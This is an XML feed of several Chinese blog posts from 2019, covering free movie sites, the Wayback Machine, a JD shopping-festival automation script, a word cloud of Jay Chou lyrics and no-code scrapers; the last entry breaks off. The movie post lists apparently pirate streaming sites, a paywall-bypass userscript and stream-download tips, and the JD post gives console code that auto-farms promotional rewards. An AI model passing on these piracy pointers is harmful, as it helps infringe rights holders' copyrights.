  <entry>
    <title><![CDATA[周末推荐几个免费在线看电影网站]]></title>
    <url>%2F2019%2F11%2F04%2F%E5%91%A8%E6%9C%AB%E6%8E%A8%E8%8D%90%E5%87%A0%E4%B8%AA%E5%85%8D%E8%B4%B9%E5%9C%A8%E7%BA%BF%E7%9C%8B%E7%94%B5%E5%BD%B1%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[今天周末，放下工作好好看了几部经典电影，这里顺便把我常用的几个电影网站做个整理。 国内常用的电影网站就是优酷，爱奇艺，腾讯等大网站了，大部分电影都可以在这些网站找到，小众的一些经典电影可以在b站找找 那些你可能不知道的 bilibili 奇技淫巧 当然有些电影需要 VIP 才能观看，比如星爷的《国产凌凌漆》https://www.iqiyi.com/v_19rrjd6es8.html?vfm=2008_aldbd&amp;fc=828fb30b722f3164&amp;fv=p_02_01 如果没有VIP可以使用油猴脚本https://github.com/syhyz1990/media/ 那些你可能不知道的免费观看 VIP 视频奇技淫巧，怎么使用油猴可以看之前的文章 Chrome 浏览器扩展神器油猴 当然体验没有使用VIP在爱奇艺上看好，如果想要完美的观看体验所以还是推荐你买VIP。 如果你觉得安装脚本什么的也麻烦，那可以看看下面这些看电影网站。 mvcat网站http://www.mvcat.com/ ，大部分电影可以在这个网站看，因为它也是抓取第三方网站的播放源，缺点就是广告多。 搜索 国产凌凌漆如果播放不了，可以点击左侧的网站切换播放源。 西瓜铺网站https://www.xiguapu.com/搜索 国产凌凌漆 找到播放页面https://www.xiguapu.com/xv/287.html 就可以在线看了，画质非常清晰。 吾爱看影视网址 http://www.5aikp.com/ 还提供rss订阅 http://www.5aikp.com/rss.xml 在播放页 http://www.5aikp.com/play/3963-3-1.html 通过控制台可以看到播放地址是m3u8文件 https://v3.szjal.cn/ppvod/0846F06809DDCEB3CE765153C50849D0.m3u8 ，可以直接通过m3u8工具把电影下载到本地，公众号回复 m3u8 获取工具。 老豆瓣网站 https://www.laodouban.com/ 虽然有豆瓣，但其实跟豆瓣没什么关系。搜索电影名进入播放页https://www.laodouban.com/b?h=5985309&amp;y=0 提供国语和粤语版。 小嘀咕影视网站http://www.xdg999.com 搜索 国产凌凌漆 找到播放页http://www.xdg999.com/play/78067-2-1.html 剧迷网站https://cn.gimy.tv/选择一个播放地址https://cn.gimy.tv/play/19431-5-1.html 低端影视网站 http://ddrk.me ，上面有豆瓣 top 250 电影合集http://ddrk.me/tag/douban-top250/#试了下张国荣的《阿飞正传》http://ddrk.me/days-of-being-wild/，播放很流畅。 电影音乐当你在看某部电影或电视剧的时候，想要知道剧里的歌叫什么，一般都是在谷歌里搜索，现在你可以使用https://www.tunefind.com/，它不光会列出都有哪些音乐，还会告诉你每首歌出现在哪个场景，比如《阿甘正传》https://www.tunefind.com/movie/forrest-gump 可惜不支持中文。我收藏整理了部分经典电影，可以在公众号回复 周星驰 张国荣 黄飞鸿 刘德华 等关键词获取。 最后推荐款产品，产品经理经常会看一些新的产品找找灵感什么的，国外的有ProductHunt，国内的自 36kr Next今年关了以后也没什么合适平台了。于是我的一位独立开发者小伙伴自己维护了一个公众号，「一群创造者」，每天发现一款有趣产品，有兴趣的小伙伴可以关注下。 其他人人影视|yytes.com视频下载四大神器https://www.isharepc.com/7504.html周杰伦 http://mctool.cn/music/index.php?__K=36a4030f38c6fb9da51e2d52445dc15a21572051982_13567&amp;page=audioPage&amp;type=migu&amp;name=%E5%91%A8%E6%9D%B0%E4%BC%A6https://www.musicenc.com/search.php?q=%E5%91%A8%E6%9D%B0%E4%BC%A6https://laodaoshaonian.com/navigation电影 http://www.mvcat.com/寻求电影推荐https://zhaodao.ai/p/10630电影fm 全网资源搜索 http://dianying.fm/movie/guo-chan-ling-ling-qi/https://zhaodao.ai/p/10630 寻求电影推荐 小程序 找到ai700 部高分电影数据分析报告 https://www.boatsky.com/blog/87汇总一下影视资源网站：1、『No视频』www.novipnoad.com2、『五星影视』www.5gkp.top3、『煎饼电影』v.jbsou.cn4、影视分享：www.ysshare.com5、酷绘视频：www.kuhuiv.com6、电影集合：www.dyjihe.com7、影视集合：www.ysjihe.com8、F8电影网：www.f8dy.tv9、音丝范：www.yinfans.me10、两个BT：www.bttwo.com11、电影蜜蜂：www.dybee.tv12、扎巴野：zabaye.com13、黑米影院：www.tv432.com14、狗带TV：www.vultr1.com15、新6V电影：www.66s.cc16、飞极速在线：fjisu.tv17、影猫：mvcat.com18、在线之家：www.zxzjs.com19、cctv直播：tv.cctv.com20、爱看TV：www.icantv.cn21、易视直播：www.cietv.com22、好趣网：www.haoqu.netb站镜像 https://www.jiligame.com/category/videohttps://www.wukongshipin.com/search?wd=%E5%91%A8%E6%98%9F%E9%A9%B0&amp;type=豆瓣top250 http://ddrk.me/tag/douban-top250/https://www.cupfox.com/?type=video&amp;key=%E5%91%A8%E6%98%9F%E9%A9%B0字幕http://www.zimuku.la/油猴https://greasyfork.org/zh-CN/scripts/30020-%E5%9C%A8%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E9%A1%B5%E9%9D%A2%E7%9B%B4%E6%8E%A5%E6%90%9C%E7%B4%A2%E7%94%B5%E5%BD%B1%E8%B5%84%E6%BA%90在豆瓣电影页面直接搜索电影资源短片https://www.vmovier.com/hot/year?from=index_hot嘀嘻嘀嘻电影网 https://www.dixidixi.com/电影法外之王 https://m.wiredtiger.org/2019/08/25/fawaizhiwang/13717735741 方正宽带导航 https://laodaoshaonian.com/navigation新媒体导航https://www.kaolamedia.com/在线解析http://tv.hwkxk.cn/ 秋瑾https://v.qq.com/x/cover/56ct84hpvjblstq/j0026mf98jh.htmlwww.novipnoad.com https://www.isharepc.com/18945.html 胖鸟电影 https://www.xjcbt.com/21.html https://www.bttwo.com/免费的在线影视网站汇总 https://hao.su/531/人人电影搜网盘 http://www.renrendianyingwang.cn/movie/ 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌]]></title>
    <url>%2F2019%2F10%2F31%2F%E8%B7%9F%E9%9A%8F%E6%97%B6%E5%85%89%E6%9C%BA%E5%9B%9E%E5%88%B0%E8%BF%87%E5%8E%BB%E7%9C%8B%E7%9C%8B-2005-%E5%B9%B4%E7%9A%84%E7%99%BE%E5%BA%A6-%E8%85%BE%E8%AE%AF-%E6%B7%98%E5%AE%9D-%E8%B0%B7%E6%AD%8C%2F</url>
    <content type="text"><![CDATA[周杰伦有2首歌《时光机》和《回到过去》，人是不可能回到过去了，但人总爱怀旧，想看看过去的网站怎么办呢？其实过去的网站在互联网上都有记录，今天就跟随杰伦一起回到过去的互联网。哦，不，是时光机，这个时光机就是网站 https://archive.org/web/，以下是维基百科https://zh.wikipedia.org/wiki/%E7%BD%91%E7%AB%99%E6%97%B6%E5%85%89%E6%9C%BA 上的介绍： 网站时光机由互联网档案馆的创始人Brewster Kahle和Bruce Gilliat于2001年推出，以解决网站在维护或关闭时无法查看内容的问题，此外还能查看网页的历史存档版本，创始人Kahle和Gilliat希望以此能为整个互联网提供“普遍获取所有知识”的途径。 还有另外一个时光机网站http://archive.md/ http://archive.is/ http://web.archive.bibalex.org/web/ 时光机把这些互联网网站的历史快照通通都存下来了, 按照时间存档.，许多年后回过来看, 就像在看老照片一样, 很有意思，下面就来看看过去那些网站的模样。 腾讯输入qq.com 可以看到从1998年到2019年的qq历史首页.我们看下2005年的1月8号的腾讯首页（可以自己选择某个快照的时间），地址 https://web.archive.org/web/20050108085749/http://www.qq.com/2005年彩铃还很流行，现在的00后应该都不知道彩铃是个什么玩意吧。 谷歌2005年的谷歌，地址 https://web.archive.org/web/20050101091102/http://www.google.com/对比下2019年的谷歌 百度2005 年的百度，地址 https://web.archive.org/web/20050805075030/http://www.baidu.com/对比下2019年的百度，输入框简洁了。 淘宝2005年的淘宝，马云在2004年就很牛了，地址 https://web.archive.org/web/20050103005457/http://www.taobao.com/new.php 对比下2019年的淘宝，眼花缭乱的。 微博微博09年才出来，那会域名还是http://t.sina.com.cn/ ，这里看看2011年的微博，地址 https://web.archive.org/web/20110201233315/http://t.sina.com.cn/ b站2011年的b站域名还是https://www.bilibili.tv/，地址https://web.archive.org/web/20111211041256/https://www.bilibili.tv/2019年的b站 优酷2008年的优酷，那年正好是北京奥运会，地址https://web.archive.org/web/20080807161704/http://www.youku.com./ 豆瓣2008年的豆瓣，可以看到星爷最后一部主演的电影《长江七号》 ，地址https://web.archive.org/web/20080229113234/http://douban.com/ 知乎2013年的知乎，地址https://web.archive.org/web/20130531070647/http://www.zhihu.com/login?next=%2Fexplore 2019年的知乎 搜索引擎快照除了上面的时光机，搜索引擎都有快照功能, 记录了当时被收录时的样子，如果某个页面打不开了，可以在搜索引擎里找找，有人还做了个快照集合网站 https://2tool.top/ 备份上面这些是大网站，http://archive.org 会定期去收录，如果是小站或者某个网页可以自己收录下，比如我的这篇文章如何发一条空白的朋友圈， 在https://web.archive.org/save 这里输入你要备份的地址。 生成的链接 https://web.archive.org/web/20191027081838/https://mp.weixin.qq.com/s/Xz1m-mqtCcBF_4hmGCpkUQ，可以永久保存我的文章了。 其他淘宝网的这个时光机 http://me.taobao.com/知乎、新浪微博、各种号、各大厂的人：请至少允许互联网档案馆（Internet Archive）抓你们的数据 https://www.v2ex.com/t/531025那些年网页的出生照 https://mp.weixin.qq.com/s/07QRlX8wjeOcEJyU-T8InA这个网站很有趣，在逗比那里看到的，网页时光机Wayback Machine，基本就是定期备份了所有网站的快照，供人查询，对于很多有网站的人来说，也可以看看当初自己网站的样子，回忆一下，其中内页也能访问，很强大http://me.taobao.com/网站地址 http://web.archive.org/不需要翻墙档案 http://web.archive.bibalex.org/web/ http://www.bibalex.org/isis/frontend/archive/archive_web.aspx上网方式的一些搜索技巧 https://felixxiong.github.io/2019/01/30/%E2%80%9C%E4%B8%8A%E7%BD%91%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%E2%80%9D/ 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于工作生活]]></title>
    <url>%2F2019%2F10%2F29%2F%E5%85%B3%E4%BA%8E%E5%B7%A5%E4%BD%9C%E7%94%9F%E6%B4%BB%2F</url>
    <content type="text"><![CDATA[Windows7忘记登陆密码进入系统方法总结 地府管理系统]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019 双十一京东全民养红包攻略分享]]></title>
    <url>%2F2019%2F10%2F28%2F2019-%E5%8F%8C%E5%8D%81%E4%B8%80%E4%BA%AC%E4%B8%9C%E5%85%A8%E6%B0%91%E5%85%BB%E7%BA%A2%E5%8C%85%E6%94%BB%E7%95%A5%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[一年一度的双十一又要来了，这次京东的活动叫全民养红包，通过每天登录浏览并关注店铺，浏览会场，逛商品等获得金币升级红包，升到5级就可以瓜分这一亿的现金红包，最高升到18级，红包等级越高，瓜分的红包就越大。 活动时间为 10月21日-11月10日18点 ，红包将于11月10日22点瓜分，具体看京东活动介绍。到5级即可抢一亿大奖，最高18级，还有好友助力、奖金翻倍的活动。红包的相关说明 如果每天三餐时间手动点击的话，得花费不少时间，这种活动让脚本来做最好了。下面分享一个好用的油猴脚本，在公众号回复 京东 获取，关于脚本使用可以查看之前的文章Chrome 浏览器扩展神器油猴 下面是使用方法： 先在网页 jd.com上登录京东 ，然后打开 https://happy.m.jd.com/babelDiy/GZWVJFLMXBQVEBDQZWMY/XJf8bH6oXDWSgS91daDJzXh9bU7/index.html 这个页面，脚本会自动运行任务逛商品，逛店铺，好玩互动，视频直播，精彩会场等。 任务很快完成了，然后登陆京东APP进入养红包查看任务结果。 如果你还是不会使用油猴脚本，可以直接在控制台输入代码来自动领取。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990let productList = [], shopList = [], url = "https://api.m.jd.com/client.action";function autoPost(id,type)&#123; fetch(`$&#123;url&#125;?timestamp=$&#123;new Date().getTime()&#125;`,&#123;method: "POST",mode: "cors",credentials: "include",headers:&#123;"Content-Type": "application/x-www-form-urlencoded"&#125;,body:`functionId=raisepacket_collectScore&amp;body=&#123;"type":$&#123;type&#125;,"ext":"$&#123;id&#125;","appsign":1,"msgsign":2&#125;&amp;client=wh5`&#125;) .then(function(response)&#123;return response.json()&#125;) .then(function(res)&#123; console.log(res.data.biz_msg); &#125;);&#125; function start()&#123; fetch(`$&#123;url&#125;?$&#123;new Date().getTime()&#125;`,&#123;method: "POST",mode: "cors",credentials: "include",headers:&#123;"Content-Type": "application/x-www-form-urlencoded"&#125;,body:'functionId=raisepacket_getShopAndProductList&amp;body=&amp;client=wh5'&#125;) .then(function(response)&#123;return response.json()&#125;) .then(function(res)&#123; productList = res.data.result.productList; shopList = res.data.result.shopList; console.log(`获取到任务,商品：$&#123;productList.length&#125; 商品：$&#123;shopList.length&#125;`); autoProductTask(); &#125;);&#125;//逛商品https://www.52pojie.cn/thread-1042128-1-1.htmlfunction autoProductTask()&#123; for(let i = 0,leng = productList.length;i&lt;leng;i++)&#123; (function(index)&#123; setTimeout(()=&gt;&#123; let item = productList[index]; autoPost(item['id'],4); console.log(`商品总任务数：$&#123;leng&#125; 当前任务数：$&#123;index + 1&#125;`); if( leng-1 == index)&#123; autoShopTask(); &#125; &#125;,index*1500) &#125;)(i) &#125;&#125;//逛店铺function autoShopTask()&#123; for(let i = 0,leng = shopList.length;i&lt;leng;i++)&#123; (function(index)&#123; setTimeout(()=&gt;&#123; let item = shopList[index]; autoPost(item['id'],2); console.log(`商铺总任务数：$&#123;leng&#125; 当前任务数：$&#123;index + 1&#125;`); if( leng-1 == index)&#123; autoPlay(); &#125; &#125;,index*1500) &#125;)(i) &#125;&#125;//好玩互动function autoPlay()&#123; for(let i = 0,leng = 4;i&lt;leng;i++)&#123; (function(index)&#123; setTimeout(()=&gt;&#123; autoPost(0,5); console.log(`好玩互动：$&#123;leng&#125; 当前任务数：$&#123;index + 1&#125;`); if( leng-1 == index)&#123; autoInteract(); &#125; &#125;,index*1000) &#125;)(i) &#125;&#125;//视频直播function autoInteract()&#123; for(let i = 0,leng = 4;i&lt;leng;i++)&#123; (function(index)&#123; setTimeout(()=&gt;&#123; autoPost(0,10); console.log(`视频直播：$&#123;leng&#125; 当前任务数：$&#123;index + 1&#125;`); if( leng-1 == index)&#123; autoShopping(); &#125; &#125;,index*1000) &#125;)(i) &#125;&#125;//精彩会场function autoShopping()&#123; for(let i = 0,leng = 3;i&lt;leng;i++)&#123; (function(index)&#123; setTimeout(()=&gt;&#123; autoPost(0,3); console.log(`精彩会场：$&#123;leng&#125; 当前任务数：$&#123;index + 1&#125;`); &#125;, index*1000) &#125;)(i) &#125;&#125;start(); 除了上面的脚本外再分享一个京东助手，功能有：试用申请，领京豆，签到，试用报告，价格保护助手，多账号登录等，公众号回复 京东 获取。 其他基于 Auto.js （ Android ）写了两个脚本来自动完成任务 https://github.com/Dcatfly/auto-task-helper京东活动能用的 https://www.ww01.net/archives/22357淘宝http://www.ww01.net/archives/23436 https://www.52pojie.cn/thread-1036256-1-1.htmlhttps://www.52pojie.cn/thread-1042796-1-1.html2019双十一自动做全民养红包任务https://greasyfork.org/zh-CN/scripts/391483https://github.com/vbonluk/JDLuckyMoneyActivity 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 词云分析周杰伦新歌《说好不哭》]]></title>
    <url>%2F2019%2F10%2F25%2FPython-%E8%AF%8D%E4%BA%91%E5%88%86%E6%9E%90%E5%91%A8%E6%9D%B0%E4%BC%A6%E6%96%B0%E6%AD%8C%E3%80%8A%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD%E3%80%8B%2F</url>
    <content type="text"><![CDATA[周杰伦难得出新歌 ，最近终于推出了单曲《说好不哭》，然后直接把QQ音乐服务器干崩了，天王的实力可见一斑，QQ音乐还把这个当作 今天过年 看我公众号头像就知道是杰伦粉了 ，高中的时候开始喜欢上了他的歌，一晃都这么多年了，我整理了他所有的歌曲和部分电影/演唱会视频，可以在公众号回复 周杰伦 获取，2个多小时的2004 无与伦比演唱会看了n遍。 还做了个杰伦的个人PPT https://sushengbuhuo.gitee.io/blog/jay/#/start，文末点击原文查看，在pc上使用空格或者方向键来查看PPT。 下面开始用词云来分析杰伦这首歌都写的什么内容。 词云 词云，又称文字云，由词汇组成类似云的彩色图形，用于展示大量文本数据，就是对网络文本中出现频率较高的“关键词”予以视觉上的突出，形成“关键词云层”，从而过滤掉大量的文本信息，使浏览者只要一眼扫过文本就可以领略文本的主旨。 歌词先看看这首歌的歌词，在QQ 音乐上可以找到https://y.qq.com/n/yqq/song/001qvvgF38HVc4.html12345678910111213141516171819202122232425262728293031323334353637没有了联络 后来的生活我都是听别人说说你怎么了 说你怎么过放不下的人是我人多的时候 就待在角落就怕别人问起我你们怎么了 你低着头护着我连抱怨都没有电话开始躲 从不对我说不习惯一个人生活离开我以后 要我好好过怕打扰想自由的我都这个时候 你还在意着别人是怎么怎么看我的拼命解释着不是我的错 是你要走眼看着你难过挽留的话却没有说你会微笑放手说好不哭让我走电话开始躲 从不对我说不习惯一个人生活离开我以后 要我好好过怕打扰想自由的我都这个时候 你还在意着别人是怎么怎么看我的拼命解释着不是我的错 是你要走眼看着你难过挽留的话却没有说你会微笑放手说好不哭让我走你什么都没有却还为我的梦加油心疼过了多久过了多久还在找理由等我 先把歌词保存到文件 no_cry.txt ，然后用Python的wordcloud来分析 。 wordcloudwordcloud 是Python的一个扩展包，直接使用pip install wordcloud来安装。https://github.com/amueller/word_cloud 123456789101112131415161718192021from PIL import Imageimport numpy as npimport matplotlib.pyplot as pltfrom wordcloud import WordCloud, STOPWORDS, ImageColorGeneratorimport jieba,wordcloudfrom snownlp import SnowNLPimport jieba.analysefrom collections import Counterwith open('no_cry.txt', 'r',encoding='utf-8') as f: data = f.read()mytext = " ".join(jieba.cut(data))wordlist = jieba.analyse.extract_tags(mytext, topK=10) # 分词，取前10['怎么', '别人', '挽留', '打扰', '放手', '说好', '在意', '没有', '从不', '拼命']#c = Counter(mytext)#c = c.most_common(10)wordcloud = WordCloud(font_path="c:\windows\fonts\simhei.ttf").generate(mytext)plt.imshow(wordcloud, interpolation='bilinear')plt.axis("off")plt.show()wordcloud.to_file('no_cry.jpg') 保存到本地的文件 no_cry.jpg图片效果： 改变下尺寸效果 接着看看这首歌的主要关键词 接着用SnowNLP对每个句子分析，先pip install SnowNLP安装，sentiments 返回值为正面情绪的概率，越接近1表示正面情绪，越接近0表示负面情绪。1234567891011121314151617181920212223s = SnowNLP(mytext)# for sentence in s.sentences:# print(sentence)# sentc = SnowNLP(sentence)# print(sentc.sentiments)&gt;&gt;&gt; s.sentiments0.9875230187654408说明这首歌是偏正面的。sentimentslist = [] s = SnowNLP(data) for sentence in s.sentences: s = SnowNLP(sentence) sentimentslist.append(s.sentiments) plt.hist(sentimentslist, bins = np.arange(0, 1, 0.01), facecolor = 'g') plt.xlabel('Sentiments Probability') plt.ylabel('Quantity') plt.title('Analysis of Sentiments') plt.show()&gt;&gt;&gt; s.summary(limit=10) 摘要 ['我都是听别人说', '不习惯一个人生活', '不习惯一个人生活', '说好不哭让我走', '说好不哭让我走', '都这个时候 你还在意着', '都这个时候 你还在意着', '电话开始躲 从不对我说', '电话开始躲 从不对我说', '挽留的话却没有说']&gt;&gt;&gt; s.keywords(limit=10)['说', '不', '还', '人', '都', '别人', '生活', '却', '走', '一个'] wordcloud_cli如果你不想写代码 ，可以直接用命令行工具wordcloud_cli ， https://amueller.github.io/word_cloud/cli.html 可以看看命令行参数 直接执行 wordcloud_cli --text no_cry.txt --imagefile no_cry.jpg --mask ye.jpg --fontfile c:\windos\fonts\simhei.ttf，生成图片效果然后加个白色背景123456789101112131415161718192021222324252627282930def handle(textfile, stopword): with open(textfile, 'r',encoding='utf-8') as f: data = f.read() wordlist = jieba.analyse.extract_tags(data, topK=100) # 分词，取前100 wordStr = " ".join(wordlist) # print (wordStr) #怎么 别人 挽留 打扰 放手 说好 在意 没有 从不 拼命 难过 多久 眼看 生活 微笑 好好 时候 习惯 自由 电话 解释 离开 的话 护着 放不下 加油 以后 问起 人多 角落 心疼 低着头 抱怨 开始 不是 联络 这个 理由 一个 后来 你们 什么 hand = np.array(Image.open('img/no_cry.jpeg')) # 打开一张图片，词语以图片形状为背景分布 my_cloudword = WordCloud( # wordcloud参数配置 width=1024, height=768, background_color = 'white', # 背景颜色 #mask = hand, # 背景图 max_words = 100, # 最大显示字数 stopwords = stopword, # 干扰词 max_font_size = 100, # 字体最大值 font_path='c:\windows\fonts\simhei.ttf', # 中文字体 random_state=3, # 设置有多少种随机生成状态，即有多少种配色方案 ) my_cloudword.generate(wordStr) # 生成图片 my_cloudword.to_file('res.jpg') # 保存 plt.axis('off') # 是否显示x轴、y轴下标 ax = plt.imshow(my_cloudword) # 显示词云图 fig = ax.figure fig.set_size_inches(25,20) # 可调节图片紧密 尺寸程度 plt.show() # 显示stopwords = set(STOPWORDS)handle('jay.txt', stopwords) 效果图 一首歌可能还看不出效果，下面以周杰伦于2003年发行的专辑《叶惠美》为例，共收录了11首歌曲 百科地址https://baike.baidu.com/item/%E5%8F%B6%E6%83%A0%E7%BE%8E/893近600行歌词，保存到文件 jay.txt效果图： 前50 前100 这张专辑的主要关键词123456['微笑 东风破 乒乓 弹奏 我们 骄傲 睫毛 不想 一曲 好难 得到 走过 琵琶 一天 天空 多强 画面 嘴角 到底 一直 粉嫩 偏偏 二班 回忆 永远 看不见 故事 不到 为什么 不用 沉默 外表 请原谅 从前 可不可以 孤独 水蜜桃 没有双刀 唇膏 怎么 知道 国度 刻着 一点 多汁 离开 渐渐 坠入 小孩 原地打转 仁慈 还要 清秀 自负 亮丽 受伤 没人能 我试 过握 大到 训导处 荒烟漫草 先对 我戒 那鲁湾 裁判 唐装 自己 依赖 第一名 答案 示好 石板路 专辑 喊叫 香味 枫叶 一股 舍不得 那年 温柔 放晴 自信 洋溢 雨淋 距离 俯瞰 看不惯 古道 刮风 篱笆 不要 天台 剥落琴声 纪录片 幽幽 预兆 还是'] 如果你不会代码怎么生成词云呢，有许多对应的网站。 wordart一个在线生成词云的网站https://wordart.com/create 将文字导入进去上传中文字体，否则乱码，效果如图： 国内也有对应的 http://cloud.niucodata.com/，将歌词复制进去。点击下方的导出图片，效果如下 公众号词云这是新榜针对公众号文章的词云分析工具，可以免费使用https://data.newrank.cn/wordCloud.html ，比如我的公众号文章词云图 资源$ pdftotext mydocument.pdf - | wordcloud_cli –imagefile wordcloud.pnghttp://duososo.com/index.php自然语言处理库之snowNLPhttps://www.jianshu.com/p/4692d1b5364d超简单：3分钟制作惊艳的词云图https://worditout.com/https://www.weiciyun.com/create.htmlhttps://wordart.com/js版 https://wordcloud2-js.timdream.org/#love https://github.com/timdream/wordcloud评论爬虫及情感分析https://www.itcodemonkey.com/article/10706.html基于SnowNLP的豆瓣评论情感分析https://blog.csdn.net/Eastmount/article/details/85118818https://bosonnlp.com/dev/resource在线词云http://ictclas.nlpir.org/nlpir/情感分析库比较https://www.ctolib.com/article/compares/1874词云https://github.com/mukund109/word-mesh将公众号所有文章出现最多的关键词并生成词云图 https://mp.weixin.qq.com/s/HF1f2DNd3u49vUM1b13DAwhttps://github.com/isnowfy/snownlphttps://www.zhihu.com/question/24658552https://zhuanlan.zhihu.com/p/21635987https://minitagcloud.cn/create.html#/ https://www.jianshu.com/p/4fb27471295fhttp://yciyun.com/ http://www.pullword.com/ https://minitagcloud.cn/http://cloud.niucodata.com/https://web.geekji.cn/web/minitagcloud.html10行python代码的词云 http://python.jobbole.com/87496/https://amueller.github.io/word_cloud/黑科技 https://magnet.chongbuluo.com/forum-47-1.html 词云https://me.bdp.cn/home.html http://www.picdata.cn http://www.tocloud.comWordArt.comTagxedo.comWordItOut.com Wordle.net https://www.bilibili.com/video/av53917673http://codewithzhangyi.com/2018/09/03/NLP%E7%AC%94%E8%AE%B0-Word-Tokenization-wordcloud/http://codewithzhangyi.com/2019/03/11/sentiment-analysis/文本分析朱自清写《匆匆》的情感状态 https://mp.weixin.qq.com/s/dOpKU0i65c5KJaxsiFWoCgPython 词云分析周杰伦《晴天》https://mp.weixin.qq.com/s?__biz=MzIyMjg2ODExMA==&amp;mid=2247483695&amp;idx=1&amp;sn=a04f03641ce7b73f130d2a3f134824c5&amp;scene=19词云可视化：四行Python代码轻松上手到精通 https://github.com/TommyZihao/zihaowordcloudhttps://1315402725.github.io/python%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86%E8%AF%8D%E4%BA%91.html周杰伦《说好不哭》新歌MV隐藏彩蛋 你发现了吗 https://www.onefm.com.my/%E5%91%A8%E6%9D%B0%E4%BC%A6%E3%80%8A%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD%E3%80%8B%E6%96%B0%E6%AD%8Cmv%E9%9A%90%E8%97%8F%E5%BD%A9%E8%9B%8B-%E4%BD%A0%E5%8F%91%E7%8E%B0%E4%BA%86%E5%90%97%EF%BC%9F/推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不会写Python代码如何抓取豆瓣电影 Top 250]]></title>
    <url>%2F2019%2F10%2F25%2F%E4%B8%8D%E4%BC%9A%E5%86%99Python%E4%BB%A3%E7%A0%81%E5%A6%82%E4%BD%95%E6%8A%93%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1-Top-250%2F</url>
    <content type="text"><![CDATA[说到爬虫，大多数人会想到用Python来做，毕竟简单好用，比如想抓取豆瓣电影top250 的所有电影数据。ps: 我收藏了部分top 250 的电影，可以回复对应电影名试试。 简单的代码如下：12345678import requestsfrom bs4 import BeautifulSoupurl = 'https://movie.douban.com/top250'headers = &#123;'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'&#125;s = BeautifulSoup(requests.get(url, headers=headers).text, 'html.parser')for link in s.find_all('span', class_='title'): print(link.text) 这样就可以输出第一页的所有电影标题，第二页的数据还需要代码处理。 但对于非程序员还是有难度的，有没有不用写代码就能抓取数据的爬虫工具呢，下面介绍几个非常实用的爬虫工具，这里还是以爬取豆瓣电影top250为例。 爬山虎采集器爬山虎采集器是一款简单易用的网页数据采集工具，通过智能算法+可视化界面，随心所欲抓取自己想到的数据。先在官网 http://www.51pashanhu.com/download 下载软件，现在我下载的版本是 v2.4.7.0 ，它已经内置了几个采集设置了，比如百度搜索，淘宝商品等。 先输入要采集的网址https://movie.douban.com/top250点下一步，因为有10页，因此要选择 自动识别分页然后保存并采集采集结果：默认只能导出到txt，需要升级会员才能导出其他格式。成功导出250条数据。txt文件内容 后羿采集器后羿采集器是一款面向零基础用户的，不限制采集和导出采集结果数量，免费不要积分的采集器，只需要输入网址就能智能识别采集结果，简直小白神器！在官网 http://www.houyicaiji.com/ 下载好软件输入网址https://movie.douban.com/top250，它会自动分页加载。点击开始采集 采集完成 这个相比上面的爬山虎采集器可以导出 excel csv text 等格式。我这里导出到excel，所有电影标题，链接，封面图片，导演，评价人数都抓取下来了。 八爪鱼采集器八爪鱼数据采集器是一款使用简单、功能强大的网络爬虫工具，完全可视化操作，无需编写代码，内置海量模板，支持任意网络数据抓取，简易采集模式内置上百种主流网站数据源，如京东、天猫、大众点评等热门采集网站，只需参照模板简单设置参数，就可以快速获取网站公开数据。软件下载地址 https://www.bazhuayu.com/download ，这个我就不演示了，另外它还有英文版 https://www.octoparse.com/download 集搜客号称把互联网装进表格和数据库 ，网址 https://www.gooseeker.com/ Web ScraperWeb Scraper 是一款免费的、适用于任何人（没有任何编程基础）的爬虫工具。操作简单，只需鼠标点击和简单的配置，就能快速的爬取 Web 端的数据。网址 https://webscraper.io，需要先下载Chrome扩展 https://chrome.google.com/webstore/detail/web-scraper/jnhgnonknehpejjnehehllkliplmbmhn 如果上不了谷歌在公众号回复 谷歌获取扩展。 具体使用教程可以参考明白大佬的文章https://www.jianshu.com/p/cd5124ac0871，作者还专门开了一门课程《不用写代码的爬虫课》。 有了上面这些工具，不会代码的你也能轻松抓取你想要的公开数据。 其他webscraper中文网点点鼠标：即可抓取网页数据 http://mhtclub.com/post/29Web Scraper 官方文档中文版.pdf文档 百度链接: 